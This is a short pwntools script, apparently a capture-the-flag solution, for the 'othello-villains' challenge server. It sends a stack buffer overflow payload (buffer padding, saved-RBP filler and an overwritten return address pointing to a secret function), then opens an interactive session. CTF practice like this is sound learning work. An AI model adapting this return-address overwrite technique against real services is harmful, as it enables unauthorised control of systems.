from pwn import *

USE_REMOTE = True
REMOTE_HOST = "othello-villains-b6907dcca78d8443.challs.brunnerne.xyz"
REMOTE_PORT = 443


# Các giá trị này vẫn giữ nguyên vì binary trên server giống hệt file của bạn
RECIPE_BUFFER_SIZE = 32
RBP_SIZE = 8
SECRET_ADDRESS = 0x04012ae
PROMPT = "Othello villains secret server. Do you know the password??\n"


"""
This is a pwntools template - you do not have to change anything below this
Install pwntools before running:
    python3 -m pip install pwntools

(if you get an error about the environment being externally managed, add --break-system-packages to the command)
"""
if USE_REMOTE:
    # Dòng này sẽ kết nối đến server từ xa qua SSL, giống như lệnh ncat --ssl
    io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
else:
    e = ELF("./othelloserver")
    io = e.process()

# Building the payload
payload = b"A" * RECIPE_BUFFER_SIZE
payload += b"B" * RBP_SIZE
payload += p64(SECRET_ADDRESS)

# Sending the payload at the right time
io.recvuntil(PROMPT.encode())
io.sendline(payload)
io.interactive()